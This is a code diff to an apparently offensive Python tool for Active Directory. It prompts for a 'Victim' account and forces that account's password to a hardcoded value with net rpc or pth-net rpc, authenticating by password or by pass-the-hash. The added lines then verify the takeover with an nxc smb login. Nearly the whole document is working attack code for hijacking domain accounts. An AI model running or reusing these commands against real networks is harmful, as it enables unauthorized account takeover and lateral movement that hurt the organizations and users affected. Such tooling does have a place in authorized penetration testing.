@@ -16,29 +16,28 @@ MAGENTA = Fore.MAGENTA
 BLUE = Fore.BLUE
 CYAN = Fore.CYAN
 RESET = Fore.RESET
-
+# Get the arguments from the argument_parser.py
+args = parse_arguments()
+# Extract arguments
+DOMAIN = args.DomainName
+USER = args.Username
+PASS = args.Password
+HASH = args.PassTheHash  
 
 def ForceChangeH():
     tar = input(f"{CYAN}Victim:{RED} ")
     subprocess.call([f"{RESET}"], shell=True)
     print(f"{YELLOW}Changing {tar} password to P@ssw0rd123!@#")
     subprocess.call([f"pth-net rpc password {tar} 'P@ssw0rd123!@#' -U {DOMAIN}/{USER}%00000000000000000000000000000000:{HASH} -S {DOMAIN}"], shell=True)
+    subprocess.call([f"nxc smb {DOMAIN} -u {tar} -p 'P@ssw0rd123!@#'"], shell=True)
 
 def ForceChangeP():
     tar = input(f"{CYAN}Victim:{RED} ")
     subprocess.call([f"{RESET}"], shell=True)
     print(f"{YELLOW}Changing {tar} password to P@ssw0rd123!@#")
     subprocess.call([f"net rpc password {tar} 'P@ssw0rd123!@#' -U {DOMAIN}/{USER}%{PASS} -S {DOMAIN}"], shell=True)
+    subprocess.call([f"nxc smb {DOMAIN} -u {tar} -p 'P@ssw0rd123!@#'"], shell=True)
 def main():
-    # Get the arguments from the argument_parser.py
-    args = parse_arguments()
-
-    # Extract arguments
-    DOMAIN = args.DomainName
-    USER = args.Username
-    PASS = args.Password
-    HASH = args.PassTheHash  
-
     # Execute the appropriate function based on the parsed arguments
     if HASH:
         ForceChangeH()
@@ -47,4 +46,5 @@ def main():
 
 if __name__ == '__main__':
     main()
+
 
